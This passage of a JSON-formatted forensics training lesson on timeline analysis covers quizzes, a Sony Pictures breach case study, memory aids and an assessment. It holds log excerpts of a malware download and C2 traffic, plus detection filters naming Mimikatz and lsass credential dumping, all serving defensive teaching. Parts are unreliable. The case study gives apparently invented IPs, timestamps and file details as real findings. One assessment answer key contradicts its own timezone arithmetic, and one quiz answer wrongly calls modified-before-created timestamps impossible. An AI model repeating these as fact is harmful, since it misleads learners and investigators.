hunt entire network for IOCs (search all endpoints for m64.exe, backup.zip)\n4. Rebuild DC from backup (assume all AD passwords compromised)\n5. Implement MFA and Credential Guard on all admin accounts"
      }
    },
    {
      "type": "quiz",
      "content": {
        "text": "## Knowledge Check: Timeline Analysis\n\n**Question 1**: You find a file with these timestamps: Created: 2025-10-27 15:00:00, Modified: 2025-10-27 14:30:00. What does this indicate?\n\nA) The file was modified before creation (normal for copied files)  \nB) Timestamps have been manipulated (timestomping)  \nC) The system clock was incorrect  \nD) This is normal behavior for Windows shortcuts\n\n**Answer**: B) It's logically impossible for a file to be modified BEFORE it was created. This is a strong indicator of timestamp manipulation. Attackers often make mistakes when manually setting timestamps.\n\n---\n\n**Question 2**: What's the BEST way to detect timestomping on Windows NTFS?\n\nA) Check if file creation time is suspiciously old  \nB) Compare $STANDARD_INFORMATION timestamps with $FILE_NAME timestamps  \nC) Look for files with exactly 00:00:00 timestamps  \nD) Check file size against modification time\n\n**Answer**: B) NTFS stores timestamps in both $STANDARD_INFORMATION (easy to modify) and $FILE_NAME (harder to modify). Mismatches between these indicate timestomping. While A and C can be indicators, B is the most reliable detection method.\n\n---\n\n**Question 3**: You're creating a timeline with Plaso. Which command filters events to only October 27, 2025?\n\nA) `psort.py -o l2tcsv timeline.plaso --date \"2025-10-27\"`  \nB) `psort.py -o l2tcsv timeline.plaso \"date >= '2025-10-27 00:00:00' AND date <= '2025-10-27 23:59:59'\"`  \nC) `log2timeline.py --filter \"2025-10-27\" timeline.plaso`  \nD) `psort.py -o l2tcsv timeline.plaso | grep \"2025-10-27\"`\n\n**Answer**: B) psort.py uses filter syntax with date comparisons. Option A doesn't use correct syntax. Option C (log2timeline) is for parsing, not filtering. Option D uses grep (less efficient than native filtering).\n\n---\n\n**Question 4**: During timeline analysis, you see Event ID 1102 (Security log cleared) at 3:00 AM. What should you do NEXT?\n\nA) Ignore it (system maintenance clears logs)  \nB) Investigate events BEFORE 3:00 AM for suspicious activity (attacker tried to hide tracks)  \nC) Focus only on events AFTER 3:00 AM  \nD) Assume the investigation is impossible due to log clearing\n\n**Answer**: B) Event 1102 means someone cleared the Security log—often to hide malicious activity. Check events BEFORE the clearing to see what the attacker was trying to hide. Also check other logs (System, Application, Sysmon) which may not have been cleared. Log clearing at 3 AM (off-hours) is highly suspicious.\n\n---\n\n**Question 5**: You're correlating evidence and find: MFT shows file created at 2:00 PM, but Prefetch shows first run at 2:30 PM. What's the likely explanation?\n\nA) The file was created but not executed until 30 minutes later  \nB) Timestamps are corrupted  \nC) The file is a system file  \nD) Prefetch is unreliable\n\n**Answer**: A) This is normal behavior. A file can be created (downloaded, copied) and executed later. Prefetch tracks first execution time, which would naturally be after creation. This correlation actually validates both artifacts. (If Prefetch showed EARLIER time than MFT creation, THAT would indicate timestomping.)"
      }
    },
    {
      "type": "real_world",
      "content": {
        "text": "## Real-World Case Study: Sony Pictures Breach Timeline\n\n### The Attack: Destructive Cyber Attack (2014)\n\n**Attacker**: Guardians of Peace (likely North Korean state-sponsored)  \n**Target**: Sony Pictures Entertainment  \n**Impact**: 100 TB data stolen, systems wiped, $100M+ damage  \n**Method**: Spear phishing → Credential theft → Lateral movement → Data exfil → Wiper malware\n\n### How Timeline Analysis Uncovered the Attack\n\nWhen Sony's systems were wiped on **November 24, 2014**, they initially thought it was a ransomware attack. **Timeline analysis revealed it was much worse—a sophisticated, multi-month intrusion.**\n\n#### Phase 1: Initial Timeline Creation\n\nForensic teams from Mandiant (now owned by Google) created super timelines from:\n- Surviving disk images (some systems not fully wiped)\n- Network logs from firewalls and proxies\n- Email server logs\n- Backup tapes (incremental backups from weeks prior)\n\n```bash\n# Timeline creation (simplified)\nlog2timeline.py --storage_file sony_timeline.plaso \\\n  /evidence/sony_servers/ \\\n  /evidence/workstations/ \\\n  /evidence/network_logs/\n\n# Result: 47 million events spanning 6 months\n```\n\n#### Phase 2: Working Backwards from Wiper Deployment\n\n**Known Event**: Wiper malware executed on **Nov 24, 2014 at 5:30 PM EST**\n\n**Timeline Analysis**:\n```\nTimestamp: 2014-11-24 17:30:00\nEvent: Scheduled Task created on 200+ systems\nTask Name: \"SystemUpdate\"\nCommand: C:\\Windows\\Temp\\wiper.exe\nCreated By: SONY\\it_admin (compromised account)\n```\n\n**Pivot 1: When was wiper.exe created?**\n```\nMFT Analysis:\nFile: C:\\Windows\\Temp\\wiper.exe\nCreated: 2014-11-24 15:00:00 (2.5 hours before execution)\nSize: 1.2 MB\nSource: Copied from \\\\10.50.100.75\\C$\\Tools\\wiper.exe\n```\n\n**Pivot 2: When was the attacker staging server (10.50.100.75) compromised?**\n```\nEvent ID 4624 (Network Logon) on 10.50.100.75:\nTimestamp: 2014-11-22 02:15:00 (2 days before wiper deployment)\nAccount: SONY\\it_admin\nSource: 10.50.100.50 (attacker-controlled workstation)\n```\n\n**Pattern Emerging**: Attacker had access at least 2 days before the wiper attack.\n\n#### Phase 3: Tracing Lateral Movement Chain\n\n**Timeline filtering** for `SONY\\it_admin` account activity:\n\n```\n2014-11-22 02:15:00 │ Login to staging server (10.50.100.75)\n2014-11-21 18:30:00 │ Login to file server (10.50.100.60)\n2014-11-20 14:00:00 │ Login to domain controller (10.50.100.10)\n2014-11-18 09:45:00 │ First use of it_admin account from 10.50.100.50\n```\n\n**Pivot 3: When was the it_admin account compromised?**\n```\nRegistry Analysis (NTUSER.DAT from workstation 10.50.100.50):\nKey: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\TypedPaths\nValue: \\\\SONY-DC01\\C$\\Users\\it_admin\\Documents\nLastWriteTime: 2014-11-18 09:40:00\n\nInterpretation: Attacker browsed it_admin's home directory (likely password file)\n```\n\n**Credential Dumping Evidence**:\n```\nPrefetch: MIMIKATZ.EXE-A1B2C3D4.pf\nFirst Run: 2014-11-18 09:30:00\nRun Count: 3\n\nEvent ID 4688 (Process Creation):\nProcess: C:\\Users\\user\\AppData\\Local\\Temp\\m.exe (Mimikatz)\nParent: powershell.exe\n```\n\n**Conclusion**: Attacker dumped credentials on Nov 18, used them to access it_admin account minutes later.\n\n#### Phase 4: Finding Initial Compromise\n\n**Working backwards from Nov 18 credential theft**:\n\n**Email Logs** (Exchange server backups):\n```\nTimestamp: 2014-09-23 10:15:00\nRecipient: user@sonypictures.com\nSubject: \"Apple ID Verification Required\"\nAttachment: apple_id_verify.doc (Malicious macro)\n```\n\n**Browser History** (from user's workstation backup):\n```\nTimestamp: 2014-09-23 10:16:32\nURL: http://45.32.105.201/stage1.exe\nFile Downloaded: C:\\Users\\user\\Downloads\\update.exe\n```\n\n**Prefetch**:\n```\nFile: UPDATE.EXE-5D6E7F8G.pf\nFirst Run: 2014-09-23 10:17:00\nRun Count: 1\nFiles Accessed:\n  - C:\\Windows\\System32\\cmd.exe\n  - C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n```\n\n**Network Logs** (Proxy logs from September):\n```\nTimestamp: 2014-09-23 10:18:00\nSource: 10.50.100.50\nDestination: 185.25.51.198:443 (C2 server)\nBytes Out: 15,432 (data exfiltration started 2 months before wiper!)\n```\n\n#### Phase 5: Data Exfiltration Timeline\n\n**Proxy logs analysis** (September - November):\n```\n2014-09-24 to 2014-11-23 (61 days)\nDestination: 185.25.51.198 (C2/Exfil server)\nTotal Data Transferred: 100 TB\nPeak Upload Rate: 2-5 AM EST (off-hours)\n\nMajor Exfil Events:\n- Oct 2-5: 15 TB (unreleased movies)\n- Oct 15-20: 30 TB (employee data, emails)\n- Nov 1-10: 40 TB (financial records, contracts)\n- Nov 15-23: 15 TB (executive communications)\n```\n\n**File Server Access Logs**:\n```\nTimestamp: 2014-10-02 02:30:00\nUser: SONY\\it_admin\nAccessed: \\\\FILE-SRV\\Movies\\Unreleased\\Fury.mp4 (2.1 GB)\n\nTimestamp: 2014-10-02 02:35:00\nNetwork: Upload to 185.25.51.198 (2.1 GB)\n\nConclusion: Unreleased movie \"Fury\" stolen Oct 2, leaked online Nov 27\n```\n\n#### Reconstructed Complete Timeline\n\n```\n┌─────────────────────────────────────────────────────────────────┐\n│              SONY PICTURES BREACH - FULL TIMELINE               │\n├─────────────────────────────────────────────────────────────────┤\n│ 2014-09-23 10:15 │ Spear phishing email sent to employee       │\n├──────────────────┼─────────────────────────────────────────────┤\n│ 2014-09-23 10:16 │ User downloads apple_id_verify.doc          │\n├──────────────────┼─────────────────────────────────────────────┤\n│ 2014-09-23 10:17 │ Macro executes, downloads update.exe        │\n├──────────────────┼─────────────────────────────────────────────┤\n│ 2014-09-23 10:18 │ C2 connection established (185.25.51.198)   │\n├──────────────────┼─────────────────────────────────────────────┤\n│ 2014-09-24 - Nov │ Reconnaissance, data exfiltration (100 TB)  │\n├──────────────────┼─────────────────────────────────────────────┤\n│ 2014-11-18 09:30 │ Mimikatz executed, credentials dumped       │\n├──────────────────┼─────────────────────────────────────────────┤\n│ 2014-11-18 09:45 │ it_admin account compromised                │\n├──────────────────┼─────────────────────────────────────────────┤\n│ 2014-11-20 14:00 │ Lateral movement to domain controller       │\n├──────────────────┼─────────────────────────────────────────────┤\n│ 2014-11-22 02:15 │ Wiper.exe staged on distribution server     │\n├──────────────────┼─────────────────────────────────────────────┤\n│ 2014-11-24 17:30 │ Wiper deployed to 200+ systems via Task     │\n│                  │ Scheduler, systems destroyed                │\n└──────────────────┴─────────────────────────────────────────────┘\n\nTOTAL DWELL TIME: 62 days (Sept 23 - Nov 24)\nDATA STOLEN: 100 TB (movies, emails, financial records)\nSYSTEMS DESTROYED: 200+ servers and workstations\n```\n\n### Key Timeline Insights\n\n1. **Initial Access was 2 months before destruction**: Everyone thought the attack started Nov 24 (wiper day), but timeline showed Sept 23 phishing was the real start.\n\n2. **Exfiltration happened slowly over 61 days**: Attackers didn't rush—they exfiltrated 100 TB at ~2 TB/day to avoid detection.\n\n3. **Credential theft was a turning point**: Timeline showed Nov 18 Mimikatz execution enabled lateral movement to DC (Nov 20) and eventual wiper deployment.\n\n4. **Off-hours activity was consistent indicator**: Nearly all malicious activity (exfil, lateral movement) occurred 2-5 AM EST.\n\n### Lessons Learned\n\n**What Timeline Analysis Revealed**:\n- ✅ True dwell time (62 days, not 1 day)\n- ✅ Complete data theft inventory (100 TB)\n- ✅ Attack methodology (phishing → cred theft → lateral movement → wiper)\n- ✅ Attacker infrastructure (C2 IP: 185.25.51.198)\n\n**What Failed**:\n- ❌ No alerting on 100 TB outbound transfer over 2 months\n- ❌ Mimikatz execution not detected\n- ❌ Privileged account (it_admin) compromise not noticed\n- ❌ Lateral movement to DC not flagged\n\n**Recommendations Implemented**:\n1. Network traffic baselining (alert on unusual upload volumes)\n2. Privileged account monitoring (alert on off-hours usage)\n3. Mimikatz detection signatures in EDR\n4. Email attachment sandboxing\n5. Incremental backups (for timeline reconstruction after wiper)\n\n**Impact**: Sony paid $100M+ in remediation, settled multiple lawsuits from employees whose data was leaked, and faced significant reputational damage.\n\n**Your Role**: As a DFIR analyst, timeline analysis skills would have been critical in reconstructing this attack. The ability to correlate email logs, network traffic, filesystem changes, and process execution over a 2-month period was essential to understanding the full scope of the breach."
      }
    },
    {
      "type": "reflection",
      "content": {
        "text": "## Reflection: Mastering Timeline Analysis\n\n**Take 5 minutes to reflect:**\n\n1. **Timeline Scope**: When investigating an incident, how do you decide the time range for your timeline? (Think: Work backwards from known compromise event, include days/weeks before for reconnaissance phase)\n\n2. **Artifact Prioritization**: If you could only parse 3 artifact types for a timeline (due to time constraints), which would you choose and why? (Consider: Event logs for user actions, MFT for file activity, Prefetch for execution history)\n\n3. **Timestomping Challenge**: You find a suspicious .exe with creation time of 2020-01-01 but Prefetch shows first run yesterday. What other artifacts would you check to confirm your suspicion of timestomping? (Think: USN Journal, AmCache, Event ID 4688, ShimCache)\n\n4. **Correlation Strategy**: You have timelines from 3 systems (workstation, server, domain controller). What's your process for correlating events across systems? (Consider: Look for matching timestamps, shared accounts, network connections between systems)\n\n5. **Real-World Application**: Think of a recent breach you've read about. What timeline questions would you need to answer for leadership? (Example: \"When did it start? How long did they have access? What data was stolen? When was it exfiltrated?\")\n\n**Action Items**:\n\n1. **This Week**: Download a practice disk image (e.g., from NIST CFReDS or Digital Corpora) and create a super timeline with Plaso. Try to answer: \"What happened on this system?\"\n\n2. **Build Your Toolkit**: Install these essential timeline tools:\n   - Plaso (log2timeline)\n   - Timeline Explorer\n   - MFTECmd (Eric Zimmerman)\n   - RegRipper (registry timeline)\n\n3. **Practice Exercise**: Create a \"timeline analysis cheat sheet\" with:\n   - Top 10 Plaso parsers to use\n   - Top 10 Timeline Explorer filters\n   - Timeline pivot questions (\"When was this file created?\" → \"What else happened at that time?\")\n\n**Mindset Note**: Timeline analysis is both an art and a science. The science is running the tools correctly. The art is knowing what questions to ask, where to pivot, and how to connect the dots. Your first timeline might feel overwhelming (millions of events!). But with practice, you'll develop intuition for filtering noise and spotting the critical events that tell the story. Keep practicing!"
      }
    },
    {
      "type": "memory_aid",
      "content": {
        "text": "## Memory Aids for Timeline Analysis\n\n### SUPER TIMELINE Artifact Types\n\n- **S**ystem files ($MFT, USN Journal)\n- **U**SN Journal (file system changes)\n- **P**refetch (application execution)\n- **E**vent Logs (Security, System, Application, Sysmon)\n- **R**egistry (persistence, user activity)\n- **T**emporary files (browser cache, downloads)\n- **I**nternet history (browser, downloads)\n- **M**emory dumps (if available)\n- **E**mail (Outlook PST, Exchange logs)\n- **L**NK files (shortcuts, recent files)\n- **I**nstalled apps (AmCache, ShimCache)\n- **N**etwork logs (proxy, firewall, PCAP)\n- **E**xternal devices (USB logs)\n\n### MACB Timestamp Meanings\n\n- **M**odified: File content changed (most reliable for \"when was file edited\")\n- **A**ccessed: File opened/read (often unreliable due to noatime or caching)\n- **C**hanged: Metadata changed (permissions, attributes, inode changes)\n- **B**orn: File created (most reliable for \"when did file first appear\")\n\n### Timestomping Detection: MISMATCH Method\n\n- **M**FT $SI vs $FN comparison\n- **I**mpossible order (Created > Modified)\n- **S**uspiciously round nanoseconds (.0000000)\n- **M**isalignment with other artifacts (Prefetch, Event Logs)\n- **A**nomalous old dates (file from 2010 in Win11 system?)\n- **T**imezone inconsistencies\n- **C**orrelation failures (MFT says 2010, Prefetch says yesterday)\n- **H**istorical evidence (USN Journal shows real creation time)\n\n### Timeline Analysis Workflow: CRIMES\n\n1. **C**ollect evidence (images, logs, artifacts)\n2. **R**un log2timeline (create .plaso database)\n3. **I**dentify time range (focus on incident window)\n4. **M**erge timelines (multiple systems → super timeline)\n5. **E**xport and filter (psort → CSV → Timeline Explorer)\n6. **S**earch for IOCs and pivot to related events\n\n### Plaso Parsers Quick Reference\n\n| Parser | Artifact | What It Reveals |\n|--------|----------|----------------|\n| **winevt** | Windows Event Logs | Logons, process creation, service installs |\n| **mft** | $MFT (Master File Table) | File creation, modification, deletion |\n| **prefetch** | Prefetch files | Application execution history |\n| **webhist** | Browser history | Websites visited, downloads |\n| **winreg** | Windows Registry | Persistence, user activity, system config |\n| **lnk** | Shortcut files | Recently accessed files and programs |\n| **recycle_bin** | $I files | Deleted files and deletion time |\n| **userassist** | UserAssist registry | GUI application usage |\n| **amcache** | AmCache.hve | Installed apps, first install time |\n| **usnjrnl** | USN Journal | File system change journal |\n\n### Timeline Explorer Filters (Common Patterns)\n\n```\n# Find executable creation\nFilename contains \".exe\" AND MACB = \"B\" (Birth)\n\n# Find PowerShell activity\nDescription contains \"powershell\"\n\n# Find downloads\nPath contains \"Downloads\" OR Description contains \"download\"\n\n# Find timestomping\nCreated > Modified\n\n# Find persistence\nPath contains \"Run\" OR Path contains \"Startup\" OR Description contains \"Task Scheduler\"\n\n# Find lateral movement\nEvent ID = 4624 AND Logon Type = 3\n\n# Find credential dumping\nDescription contains \"lsass\" OR Description contains \"mimikatz\"\n\n# Find log clearing\nEvent ID = 1102 OR Event ID = 104\n```\n\n### Lateral Movement Timeline Indicators: CREDS\n\n- **C**redential dumping (Mimikatz, Event ID 4656 on lsass)\n- **R**emote logons (Event ID 4624, Logon Type 3)\n- **E**xecution on remote system (PsExec, WMI, Task Scheduler)\n- **D**ata staging (large files copied to temp, zip creation)\n- **S**MB connections (admin shares: ADMIN$, C$, IPC$)\n\n### Data Exfiltration Timeline Indicators: UPLOAD\n\n- **U**nusual volumes (large outbound transfers)\n- **P**OSTing data (HTTP POST, FTP uploads)\n- **L**arge files (zip, rar, 7z creation before upload)\n- **O**ff-hours activity (2-5 AM transfers)\n- **A**nomalous destinations (cloud storage, new external IPs)\n- **D**uration (sustained connections, not brief)\n\n### Timezone Handling (Critical!)\n\n**Remember**:\n- NTFS stores timestamps in UTC\n- Event Logs store timestamps in local system time\n- Timeline Explorer can convert to any timezone\n- ALWAYS note timezone in your report\n\n**Example**:\n```\nMFT: File created at 19:00:00 UTC\nEvent Log: Process created at 15:00:00 EST (UTC-4)\n\nBoth timestamps = same event (19:00 UTC = 15:00 EST)\n```\n\n### Timeline Pivot Questions\n\nWhen you find a suspicious event, ask:\n\n1. **What happened RIGHT BEFORE this?** (30 seconds - 5 minutes before)\n2. **What happened RIGHT AFTER this?** (30 seconds - 5 minutes after)\n3. **What ELSE happened at this EXACT timestamp?** (same second)\n4. **What else did this USER do?** (filter by username)\n5. **What else did this PROCESS do?** (filter by PID)\n6. **What else touched this FILE?** (filter by filename)\n7. **What other systems were accessed?** (filter by IP/hostname)"
      }
    }
  ],
  "post_assessment": [
    {
      "question": "You find a file with $STANDARD_INFORMATION Created: 2020-01-01 00:00:00 and $FILE_NAME Created: 2025-10-27 14:32:15. What's the most likely explanation?",
      "options": [
        "The file was legitimately created in 2020 and modified in 2025",
        "The file was timestomped (attacker modified $SI but not $FN)",
        "The system clock was wrong when the file was created",
        "This is normal behavior for copied files"
      ],
      "correct_answer": 1,
      "explanation": "The $FILE_NAME timestamp (2025-10-27) is harder to modify than $STANDARD_INFORMATION. When they don't match, it indicates timestomping. The attacker modified $SI to make the file look old (2020) but couldn't easily modify $FN, which reveals the real creation time (2025-10-27).",
      "question_id": "51f3dd69-8dea-4183-a733-7aa2a0128024",
      "type": "multiple_choice",
      "difficulty": 3
    },
    {
      "question": "During timeline analysis, you want to find when a user account was first used for lateral movement. Which artifact combination is MOST useful?",
      "options": [
        "Browser history + Downloads folder",
        "Event ID 4624 (Logon) + SMB connections in network logs",
        "Prefetch + ShimCache",
        "$MFT timestamps + Registry Run keys"
      ],
      "correct_answer": 1,
      "explanation": "Lateral movement involves logging into remote systems (Event ID 4624, Logon Type 3 = Network) and often uses SMB (port 445) for file access or PsExec. Correlating Windows Event Logs with network logs provides timestamps and source/destination systems. Other options detect local activity but not lateral movement.",
      "question_id": "2e18a0a3-678d-4a1d-a187-c4700d2fdd4c",
      "type": "multiple_choice",
      "difficulty": 3
    },
    {
      "question": "You're using Plaso and want to create a timeline of ONLY Windows Event Logs and Prefetch files (to focus on execution). Which command is correct?",
      "options": [
        "log2timeline.py --parsers \"all\" evidence.dd",
        "log2timeline.py --parsers \"winevt,prefetch\" evidence.dd",
        "psort.py --filter \"winevt,prefetch\" timeline.plaso",
        "log2timeline.py --artifacts \"events,execution\" evidence.dd"
      ],
      "correct_answer": 1,
      "explanation": "The --parsers flag in log2timeline.py specifies which artifact types to parse. \"winevt\" = Windows Event Logs, \"prefetch\" = Prefetch files. This targeted approach is faster than parsing everything (\"all\"). Option C uses psort (for filtering output, not parsing). Option D uses incorrect flag syntax.",
      "question_id": "51761705-654f-4253-98e0-44175a9db6ac",
      "type": "multiple_choice",
      "difficulty": 3
    },
    {
      "question": "You see Event ID 1102 (Security log cleared) at 3:15 AM. What should this tell you?",
      "options": [
        "Routine system maintenance occurred",
        "An attacker likely cleared logs to hide activity; investigate events BEFORE 3:15 AM",
        "The system clock is incorrect",
        "The investigation is compromised and cannot proceed"
      ],
      "correct_answer": 1,
      "explanation": "Event ID 1102 (log clearing) at 3:15 AM (off-hours) is highly suspicious—attackers often clear logs to hide their tracks. The key insight: investigate events BEFORE the clearing to see what they tried to hide. Also check other log sources (System, Application, Sysmon, network logs) which may still have evidence. The investigation can absolutely proceed.",
      "question_id": "aeeb63e1-a644-4c59-8012-da924a695259",
      "type": "multiple_choice",
      "difficulty": 3
    },
    {
      "question": "You're correlating timelines from 3 systems (workstation, DC, file server). You see: Workstation Event ID 4688 at 15:30:00 EST, DC Event ID 4624 at 20:30:00 UTC, File Server log at 15:30:00 EST. Which events are simultaneous?",
      "options": [
        "All three events happened at different times",
        "Workstation and File Server events are simultaneous (both 15:30 EST)",
        "Workstation and DC events are simultaneous (15:30 EST = 20:30 UTC)",
        "DC and File Server events are simultaneous"
      ],
      "correct_answer": 2,
      "explanation": "Timezone conversion: EST = UTC-5. So 15:30 EST = 20:30 UTC. The workstation (15:30 EST) and DC (20:30 UTC) events happened at the exact same moment, just displayed in different timezones. The File Server event (15:30 EST) happened at a different time than the DC event. Always convert to a single timezone (usually UTC) when correlating multi-system timelines.",
      "question_id": "0b3b2da5-9eb3-482e-ba72-b6279da175de",
      "type": "multiple_choice",
      "difficulty": 3
    }
  ],
  "jim_kwik_principles": [
    "active_learning",
    "memory_hooks",
    "minimum_effective_dose",
    "teach_like_im_10",
    "meta_learning",
    "connect_to_what_i_know",
    "reframe_limiting_beliefs",
    "gamify_it",
    "learning_sprint",
    "multiple_memory_pathways"
  ]
}